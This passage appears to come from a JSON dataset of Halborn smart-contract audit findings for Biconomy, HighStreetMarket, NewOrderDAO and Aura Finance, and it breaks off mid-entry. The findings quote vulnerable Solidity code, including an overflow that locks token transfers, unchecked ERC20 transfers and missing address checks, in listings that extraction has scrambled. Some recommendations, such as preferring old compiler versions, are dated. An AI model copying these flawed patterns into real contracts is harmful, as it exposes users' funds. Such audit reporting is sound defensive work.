        "body": "The project uses one of the latest pragma version (0.8.0) which was released on 16th of December, 2020. The latest pragma version (0.8.9) was released in October 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. In the Solitidy Github repository, there is a JSON file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Code Location: Listing 6 1 libs / BaseRelayRecipient . sol :3: pragma solidity ^0.8.0; 2 libs / IRelayRecipient . sol :2: pragma solidity ^0.8.0; 3 test / Greeter . sol :2: pragma solidity ^0.8.0; 4 BiconomyTokenTransparent . sol :4: pragma solidity ^0.8.2; 5 bico / BicoTokenProxy . sol :4: pragma solidity ^0.8.0; 6 bico / ERC20Meta . sol :3: pragma solidity ^0.8.0; 7 bico / BicoTokenImplementation . sol :2: pragma solidity ^0.8.0; 8 bico / BicoTokenV2 . sol :2: pragma solidity ^0.8.0; 9 bico / BicoToken . sol :4: pragma solidity ^0.8.0; 10 bico / BicoToken . sol :9: pragma solidity ^0.8.0; 11 bico / BicoToken . sol :97: pragma solidity ^0.8.0; 12 bico / BicoToken . sol :124: pragma solidity ^0.8.0; 13 bico / BicoToken . sol :335: pragma solidity ^0.8.0; 14 bico / BicoToken . sol :402: pragma solidity ^0.8.0; 15 BiconomyTokenUUPS . sol :5: pragma solidity ^0.8.2; 24 Risk Level: Likelihood - 2 Impact - 2 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. References:  Solidity Releases  Solidity Bugs By Version Remediation Plan: ACKNOWLEDGED: Biconomy Team decided to use pragma 0.8.4. 25 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During a manual review, the use of block.timestamp has identified. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 7: contracts/bico-token/bico/BicoTokenImplementation.sol 971 require ( _deadline == 0 || block . timestamp <= _deadline , \" BICO :: expired transfer \"); Risk Level: Likelihood - 3 Impact - 1 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. 26 Remediation Plan: ACKNOWLEDGED: Biconomy Team acknowledged this issue and claims that Usage of block.timestamp does not possess any security risks. 27 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED FUNCTIONS AND VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During the test, it was determined that some functions and variables on the contract were not used in any way, although they were defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. Code Location: Listing 8: Unused Functions and Variables 779 increaseAllowance ( address spender , uint256 addedValue ) 780 decreaseAllowance ( address spender , uint256 subtractedValue ) 781 _burn ( address account , uint256 amount ) 782 uint 256 batchNonce Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to review these unused functions and variables, and to delete them from the contract if they will continue to be unused. 28 Remediation Plan: NOT APPLICABLE: Since all variables and functions addressed on this vulnerability are used on the contract, this vulnerability is not appli- cable.  increaseAllowance and decreaseAllowance are public versions for users.  _batchNonce variable is removed from signature functions. 29 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISUSE OF FUNCTION HOOKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During the audit, it was seen that two hook functions were implemented on the contract. The purpose of using these functions under normal conditions is to detect variables such as gas usage. However, it has been seen that these two functions defined on the contract have no purpose. Code Location: Listing 9: contracts/bico-token/bico/BicoTokenImplementation.sol 890 function _beforeTokenTransfer ( 891 892 893 894 address from , address to , uint256 amount ) internal virtual {} Listing 10: contracts/bico-token/bico/BicoTokenImplementation.sol 910 function _afterTokenTransfer ( 911 912 913 914 address from , address to , uint256 amount ) internal virtual {} Risk Level: Likelihood - 1 Impact - 1 30 Recommendations: It is recommended that these functions be implemented in accordance with their purpose, and if not, they should be deleted from the contract. Remediation Plan: SOLVED: _beforeTokenTransfer and _afterTokenTransfer hook functions. Biconomy Team solved issue this by removing unused 31 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Informational"
        ]
    },
    {
        "title": "AMOUNT PARAMETER CAN BE REMOVED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract HighStreetNftPool contains the function unstakeReward( uint256 _depositId, uint256 _amount) which allows a user to unstake a specified amount of rewards. The _amount parameter here does not provide any utility, as there is no incentive for the user to just claim a part of his total rewards. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the _amount parameter from the unstakeReward() and _unstakeReward() functions. The full reward amount should be sent to the user instead. This will simplify the logic of the functions, saving some gas. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 079f3c357f653d57452059a13d66ec994c80753a 12 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_NFT_Pool",
            "Severity: Informational"
        ]
    },
    {
        "title": "EMERGENCYWITHDRAW FUNCTION DOES NOT PROVIDE ANY UTILITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract HighStreetNftPool contains the functions emergencyWithdraw() and _emergencyWithdraw(): Listing 1: emergencyWithdraw - external (Lines 441) 439 function emergencyWithdraw ( uint256 [] calldata _listIds ) external nonReentrant { // delegate call to an internal function _emergencyWithdraw ( msg . sender , _listIds ); 440 441 442 } Listing 2: emergencyWithdraw - internal require ( _listIds . length > 0, \" zero amount \" ); // limit the max nft transfer . require ( _listIds . length <= 40 , \" length exceeds limitation \" ); // get a link to user data struct , we will write to it later User storage user = users [ _staker ]; uint16 [] memory list = user . list ; uint256 amount = _listIds . length ; require ( user . tokenAmount >= amount , \" amount exceeds stake \" ); 639 function _emergencyWithdraw ( address _staker , 640 641 uint256 [] calldata _listIds 642 ) internal virtual { 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 658 // update smart contract state _sync () ; // update user record user . tokenAmount -= amount ; user . subYieldRewards = tokenToReward ( user . tokenAmount , yieldRewardsPerToken ); 13 659 660 661 662 663 664 665 666 667 668 669 670 671 672 673 674 675 676 677 678 679 680 681 } usersLockingAmount = usersLockingAmount - amount ; uint256 index ; uint256 [] memory nfts = new uint256 []( _listIds . length ); for ( uint i =0; i < _listIds . length ; i ++) { index = _listIds [ i ]; if ( UINT_16_MAX == list [ index ]) { nfts [ i ] = 0; } else { nfts [ i ] = uint256 ( list [ index ]) ; } IERC721 ( poolToken ). safeTransferFrom ( address ( this ) , _staker , nfts [ i ]) ; if ( user . tokenAmount != 0) { delete user . list [ index ]; } } if ( user . tokenAmount == 0) { delete user . list ; } emit EmergencyWithdraw ( msg . sender , amount , nfts ); The function _emergencyWithdraw() contains the same code as the _unstake() function, and it is not providing any extra functionality. Furthermore, there is no locking applied to the staked NFTs which means that the user has no restrictions to retrieve them. There is no need for any kind of emergencyWithdraw function in the smart contract. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the emergencyWithdraw() and _emergencyWithdraw () functions. 14 Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID a9e1c25ec2de219e1f66c31b51d7b7a7997b15b3 15 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_NFT_Pool",
            "Severity: Informational"
        ]
    },
    {
        "title": "SOME FUNCTIONS CAN BE REMOVED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract HighStreetNftPool contains the function mintYieldTo(): Listing 3: mintYieldTo // transfer HIGH tokens as required transferHighToken ( _to , _amount ); 689 function mintYieldTo ( address _to , uint256 _amount ) internal { 690 691 692 693 694 } emit MintYield ( _to , _amount ); This mintYieldTo() function, all it does is calling another internal function: transferHighToken(): Listing 4: transferHighToken 842 function transferHighToken ( address _to , uint256 _value ) internal { 843 844 845 } // just delegate call to the target SafeERC20 . safeTransfer ( IERC20 ( HIGH ) , _to , _value ); At the same time, the transferHighToken() function just calls the SafeERC20.safeTransfer(IERC20(HIGH), _to, _value); function. mintYieldTo() and transferHighToken() can be removed and instead SafeERC20 .safeTransfer can be used directly to save some gas. Risk Level: Likelihood - 1 Impact - 1 16 Recommendation: It is recommended to remove the mintYieldTo() and transferHighToken() functions and instead use directly SafeERC20.safeTransfer. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 8c6269aff32496a7e75630a63abbf80f5015d18a 17 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_NFT_Pool",
            "Severity: Informational"
        ]
    },
    {
        "title": "GAS OVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In all the loops, the counter variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: HighStreetNftPool.sol - Line 307: for(uint256 i = pageStart; i < pageEnd; i++){ - Line 350: for(uint256 i = pageStart; i < pageEnd; i++){ - Line 520: for(uint i =0; i < _nftIds.length; i++){ - Line 571: for(uint i =0; i < _listIds.length; i++){ - Line 663: for(uint i =0; i < _listIds.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 5: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This is not applicable outside of loops. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID a4017a4a5eeedb24d3792744cf71c5d0dcf5394c 19 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_NFT_Pool",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNECESSARY INITIALIZATION OF UINT256 VARIABLES TO 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_NFT_Pool_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As i is an uint, it is already initialized to 0. uint i = 0 reassigns the 0 to i which wastes gas. Code Location: HighStreetNftPool.sol - Line 519: uint256 addedAmount = 0; - Line 520: for(uint i =0; i < _nftIds.length; i++){ - Line 571: for(uint i =0; i < _listIds.length; i++){ - Line 663: for(uint i =0; i < _listIds.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize i variable to 0 to save some gas. For example: for(uint i; i < _nftIds.length; i++){ Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 8f715b12b6fcc4ce25f27fc2357ab268a1c35472 20 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_NFT_Pool",
            "Severity: Informational"
        ]
    },
    {
        "title": "OVERFLOW IN CALCMAXTRANSFERRABLE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract, TimeLockToken the function calcMaxTransferrable() is used to calculate the maximum amount of transferrable tokens for an address: Listing 1: GovernanceTokenV2.sol (Lines 131) 112 // / @dev Calculates the maximum amount of transferrable tokens for address `who ` public view returns ( uint256 ) 113 // / @return Number of transferrable tokens 114 function calcMaxTransferrable ( address who ) 115 116 117 118 { 119 120 121 122 123 if ( timelockedTokens [ who ] == 0) { return balanceOf ( who ); } uint256 maxTokens ; if ( vestTime [ who ] > block . timestamp || cliffTime [ who ] > block . timestamp ){ maxTokens = 0; } else { maxTokens = timelockedTokens [ who ] * ( block . timestamp - vestTime [ who ]) / disbursementPeriod [ who ]; } if ( timelockedTokens [ who ] < maxTokens ){ return balanceOf ( who ); } return balanceOf ( who ) - timelockedTokens [ who ] + maxTokens ; 124 125 126 127 128 129 130 131 132 } function called This _beforeTokenTransfer() hook: is with every transfer because of the 13 Listing 2: GovernanceTokenV2.sol (Lines 105) address from , address to , uint256 amount 100 function _beforeTokenTransfer ( 101 102 103 104 ) internal virtual override { 105 106 107 108 109 } } uint maxTokens = calcMaxTransferrable ( from ); if ( from != address (0 x0 ) && amount > maxTokens ){ revert (\" amount exceeds available unlocked tokens \"); An overflow can occur in the return balanceOf(who)- timelockedTokens[who ] + maxTokens; line that will not allow the user to transfer any of his tokens, even if they are unlocked, until the end of the disbursementPeriod Proof of Concept: The Proof of Concept was executed using the following parameters: - timelockedTokens -> 1000_000000000000000000 - vestTime -> chain.time() = now() - cliffTime -> chain.time() + 15768000 = 6 months - disbursementPeriod -> 31536000 seconds = 1 year 6 months later 500_000000000000000000 of the user2 tokens were Then: 1. Waited 6 months: chain.sleep(15768000). 2. unlocked. 3. 200_000000000000000000 tokens were successfully transferred from user2 to user3. 4. user2 tried then to transfer another 200_000000000000000000 to user4. The transfer reverts with an Integer overflow error. All of the user2 tokens are totally locked now. 5. After this, user2 has to wait until the end of the disbursementPeriod to be able to transfer his tokens. 14 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the overflow and the overall logic of the calcMaxTransferrable() function. Remediation Plan: SOLVED: this e7547837502f1e48151a52acaaa5c722dca4c253: NewOrderDAO team solved issue in the commit ID: 15 16 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Critical"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contracts DisbursementCliff and OneWaySwap the return value of some external transfer calls are not checked. Several tokens do not revert in case of failure and return false. If that happened, for example in the DisbursementCliff contract, the withdrawnTokens state variable would be incorrectly updated and the calculation of the amount of vested tokens would be wrong. It is also considered a best practice to check the return value of a ERC20.transfer() call. Code Location: DisbursementCliff.sol Listing 3: DisbursementCliff.sol (Lines 76,86) revert (\" Withdraw amount exceeds allowed tokens \" ); public isReceiver uint maxTokens = calcMaxWithdraw () ; if ( _value > maxTokens ){ } withdrawnTokens += _value ; token . transfer ( _to , _value ); 67 function withdraw ( address _to , uint256 _value ) 68 69 70 { 71 72 73 74 75 76 77 } 78 79 // / @dev Transfers all tokens to multisig wallet 80 function walletWithdraw () 81 82 83 { 84 85 86 87 } uint balance = token . balanceOf ( address ( this )) ; withdrawnTokens += balance ; token . transfer ( wallet , balance ); public isWallet 17 one-way-swap.sol Listing 4: one-way-swap.sol (Lines 36,37,44) oldToken . transferFrom ( msg . sender , burnAddress , amount ); newToken . transfer ( msg . sender , amount ); public whenNotPaused 32 function swap ( uint256 amount ) 33 34 35 { 36 37 38 } 39 40 function burn ( uint256 amount , string memory why ) 41 42 43 { 44 45 46 } public whenNotPaused oldToken . transferFrom ( msg . sender , burnAddress , amount ); emit Burned ( msg . sender , amount , why ); Listing 5: one-way-swap.sol (Lines 70) 66 function walletWithdraw ( ERC20 token , uint256 amount , address destination ) public onlyOwner token . transfer ( destination , amount ); 67 68 69 { 70 71 } Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to use SafeERC20. 18 Remediation Plan: SOLVED: NewOrderDAO team now makes use of SafeERC20.safeTransfer() and SafeERC20.safeTransferFrom() in all their token transfers. 19 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The constructor of the OneWaySwap contract is missing address validation. Every address should be validated and checked that is different from zero. This is also considered a best practice. Code location: Listing 6: one-way-swap.sol (Lines 24) 24 constructor ( ERC20 oldToken_ , ERC20 newToken_ , address burnAddress_ ) oldToken = oldToken_ ; newToken = newToken_ ; burnAddress = burnAddress_ ; _pause () ; 25 { 26 27 28 29 30 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: NewOrderDAO team added the zero address checks. 20 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Low"
        ]
    },
    {
        "title": "SOLC 0.8.3 COMPILER VERSION CONTAINS MULTIPLE BUGS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.3 set in the truffle-config.js file of the GovernanceTokenV2 project is missing all these fixes:  0.8.4  0.8.9 Code Location: Listing 7: GovernanceTokenV2.sol 1 pragma solidity ^0.8.3; Listing 8: truffle-config.js (Lines 102) 100 compilers : { 101 102 solc : { version : \" 0.8.3 \" , // Fetch exact version from solc - bin ( default : truffle 's version ) // docker : true , // Use \"0.5.1\" you 've installed locally with docker ( default : false ) // settings : { // See the solidity docs for advice about optimization and evmVersion optimizer : { enabled : false , runs : 200 }, evmVersion : \" byzantium \" 21 103 104 105 106 107 108 109 110 111 112 }, }, // // // // // // } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if you still want to use ^0.8.0, because of the new functionality it provides, it is recommended to use 0.8.9 version. Remediation Plan: SOLVED: NewOrderDAO team set in the truffle-config.js file the 0.8.9 version for the contracts GovernanceTokenV2 and OneWaySwap and the 0.6.12 version for the DisbursementCliff contract. 22 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: GovernanceTokenV2.sol - newTimeLock() (GovernanceTokenV2.sol#70-85) - balanceUnlocked() (GovernanceTokenV2.sol#158-160) DisbursementCliff.sol - withdraw() (DisbursementCliff.sol#67-77) - walletWithdraw() (DisbursementCliff.sol#80-87) one-way-swap.sol - swap() (onewayswap.sol#32-38) - burn() (onewayswap.sol#40-46) - walletWithdraw() (onewayswap.sol#66-71) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. 23 Remediation Plan: SOLVED: NewOrderDAO team declared the mentioned functions as external to reduce the gas costs. 24 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Informational"
        ]
    },
    {
        "title": "TIMELOCKTOKEN IS NOT PAUSABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NewOrderDAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Even if this The contract TimeLockToken is not pausable/ownable. addition would add centralization it could be useful in case of an emergency, for example, the token could be paused in case of a cross-chain bridge hack. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In case of wanting to add an extra security layer, Halborn recommends making the contract pausable as a mitigation against external contract hacks. Remediation Plan: SOLVED: NewOrderDAO team created a Pausable variant of the TimeLockToken contract called GovernanceTokenPausable. NewOrderDAO team will decide which variant to deploy. 25 ",
        "labels": [
            "Halborn",
            "NewOrderDAO",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF TRANSFEROWNERSHIP PATTERN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The current ownership transfer process for the Aura contracts inheriting from Ownable involves the current owner calling the transferOwnership() function: Listing 1: Ownable.sol function _transferOwnership ( address newOwner ) internal virtual address oldOwner = _owner ; _owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); } 71  { 72 73 74 75 76 } If the nominated account is not a valid account, it is entirely possible that the owner may accidentally transfer ownership to an uncontrolled account, losing the access to all functions with the onlyOwner modifier. For example, in the case of the AuraLocker contract, if a not valid account was assigned as a owner, administrative functions such as recovering LP rewards from other systems or shutting down the contract will not be possible. This issue also applies to other types of privilege transfer methods, like the setAdmin function in the AuraVestedEscrow contract: Listing 2: AuraVestedEscrow.sol (Line 206) 79 80 81 82 function setAdmin ( address _admin ) external { require ( msg . sender == admin , \"! auth \"); admin = _admin ; } 14 Affected Contracts: - aura-contracts/AuraClaimZap.sol - aura-contracts/AuraLocker.sol - aura-contracts/AuraPenaltyForwarder.sol - aura-contracts/ExtraRewardsDistributor.sol - aura-contracts/AuraVestedEscrow.sol - convex-platform/Booster.sol - convex-platform/ConvexMasterChef.sol Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated account is a valid and active account. Remediation Plan: RISK ACCEPTED: The Aura Finance team accepted the risk of this finding and does not plan to correct it in the future in order to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 15 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "DUPLICATE ENTRY IN THE VESTING DISTRIBUTION LIST",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "0xcc6548f1b572968f9539d604ec9ff4b933c1be74 address accidentally appeared twice in the AURA vesting distribution list (tasks/deploy/mainnet-config .ts). Listing 3: tasks/deploy/mainnet-config.ts 170 // 24 MONTHS - 8.45% 171 { 172 173 174 period : ONE_WEEK . mul (104) , recipients : [ { address : \" 0 xe3B6c287C1369C6A4fa8d4e857813695C52948EF \" ,  amount : simpleToExactAmount (0.275 , 24) }, // Core team 175 { address : \" 0 x023320e0C9Ac45644c3305cE574360E901c7f582 \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 176 { address : \" 0 xB1f881f47baB744E7283851bC090bAA626df931d \" ,  amount : simpleToExactAmount (3.5 , 24) }, // Core team 177 { address : \" 0 xE4b32828B558F17BcaF5efD52f0C067dba38833c \" ,  amount : simpleToExactAmount (0.45 , 24) }, // Core team 178 { address : \" 0 xcc6548f1b572968f9539d604ec9ff4b933c1be74 \" ,  amount : simpleToExactAmount (0.075 , 24) }, // Core team 179 { address : \" 0 x51d63958a63a31eb4028917f049ce477c8dd07bb \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 180 { address : \" 0 x3078c3b436511152d86675f9cbfd89ec1672f804 \" ,  amount : simpleToExactAmount (0.3 , 24) }, // Core team 181 { address : \" 0 x3000d9b2c0e6b9f97f30abe379eaaa8a85a04afc \" ,  amount : simpleToExactAmount (0.325 , 24) }, // Core team 182 { address : \" 0 x3CBFFF3E75881c1619eaa82DC724BDEE6fF6ED19 \" ,  amount : simpleToExactAmount (0.06 , 24) }, // Core team 183 { address : \" 0 xaf3824e8401299B25C4D59a8a035Cf9312a3B454 \" ,  amount : simpleToExactAmount (0.175 , 24) }, // Core team 184 { address : \" 0 x738175DB2C999581f29163e6D4D3516Ad4aF8834 \" ,  amount : simpleToExactAmount (0.125 , 24) }, // Core team 185 { address : \" 0 x0d9A5678E73e5BbC0ee09FAF8e550B196c76fDad \" ,  amount : simpleToExactAmount (0.5 , 24) }, // Core team 186 { address : \" 0 x285b7EEa81a5B66B62e7276a24c1e0F83F7409c1 \" ,  amount : simpleToExactAmount (1.5 , 24) }, // Core team 16 187 { address : \" 0 xbee5a45271cc66a5b0e9dc4164a4f9df196d94fa \" ,  amount : simpleToExactAmount (0.125 , 24) }, // Core team 188 { address : \" 0 xcc6548f1b572968f9539d604ec9ff4b933c1be74 \" ,  amount : simpleToExactAmount (0.04 , 24) }, // Core team 189 190 }, ], Aura Finance used this list to fund recipients with AURA reward tokens: Listing 4: scripts/deploySystem.ts 700 const vestingAddr = vestingGroup . recipients . map ( m => m .  address ); 701 const vestingAmounts = vestingGroup . recipients . map ( m => m .  amount ); 702 tx = await vestedEscrow . fund ( vestingAddr , vestingAmounts ); Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended reviewing the configuration data used to fund the vesting recipients and, if necessary, correcting the values using the vesting admin. Remediation Plan: RISK ACCEPTED: The Aura Finance team will correct this finding through the governance. 17 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "MISTAKENLY SENT ERC20 TOKENS CAN NOT RESCUED IN THE CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contracts are missing functions to sweep/rescue accidental ERC-20 Accidentally, sent ERC-20 tokens will be locked in the transfers. contracts. Recommendation: Consider adding a function to sweep accidental ERC-20 transfers to the contracts. Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to fix it in the future to keep the difference between Aura and Convex as minimal as possible to aid in the manual reviews and minimize the chance of introducing bugs. 18 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING POSTFIX OPERATORS IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the loops below, postfix (e.g. i++) operators were used to increment or decrement variable values. It is known that, in loops, using prefix operators (e.g. ++i) costs less gas per iteration than using postfix operators. Code Location: aura-contracts/AuraClaimZap.sol - Line 134 for (uint256 i = 0; i < rewardContracts.length; i++){ - Line 138 for (uint256 i = 0; i < extraRewardContracts.length; i++){ - Line 142 for (uint256 i = 0; i < tokenRewardContracts.length; i++){ aura-contracts/AuraLocker.sol - Line 176 for (uint256 i = 0; i < rewardTokensLength; i++){ - Line 332 for (uint256 i; i < rewardTokensLength; i++){ - Line 350 for (uint256 i; i < rewardTokensLength; i++){ - Line 450 for (uint256 i = nextUnlockIndex; i < length; i++){ - Line 466 nextUnlockIndex++; - Line 537 i--;; aura-contracts/AuraVestedEscrow.sol - Line 105 for (uint256 i = 0; i < _recipient.length; i++){ aura-contracts/BalLiquidityProvider.sol - Line 52 for (uint256 i = 0; i < 2; i++){ aura-contracts/ExtraRewardsDistributor.sol - Line 242 for (uint256 i = epochIndex; i < tokenEpochs; i++){ convex-platform/ArbitartorVault.sol - Line 49 for(uint256 i = 0; i < _toPids.length; i++){ 19 convex-platform/BaseRewardPool.sol - Line 218 for(uint i=0; i < extraRewards.length; i++){ - Line 234 for(uint i=0; i < extraRewards.length; i++){ - Line 266 for(uint i=0; i < extraRewards.length; i++){ - Line 300 for(uint i=0; i < extraRewards.length; i++){ convex-platform/Booster.sol - Line 380 for(uint i=0; i < poolInfo.length; i++){ - Line 539 for(uint256 i = 0; i < _gauge.length; i++){ convex-platform/BoosterOwner.sol - Line 144 for(uint256 i = 0; i < poolCount; i++){ convex-platform/ExtraRewardStashV3.sol - Line 125 for(uint256 i = 0; i < maxRewards; i++){ - Line 201 for(uint i=0; i < tCount; i++){ convex-platform/PoolManagerSecondaryProxy.sol - Line 69 for(uint i=0; i < usedList.length; i++){ It is also possible to further optimize loops by using unchecked loop index incrementing and decrementing. 20 Proof of Concept: For example, based on the following test contract: Listing 5: GasTestIncrement.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestIncrement { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } unchecked { ++ i; } } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } } function uncheckedpreiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ;) { We can see the difference in gas costs: 21 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use unchecked ++i and --j operations instead of i++ and j-- to increment or decrement the values of a uint variables inside loops. This does not just apply to the iterator variables, but the increments and decrements done inside the loops code blocks too. It is noted that using unchecked operations requires particular caution to avoid overflows. Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future in order to keep the difference between Aura and 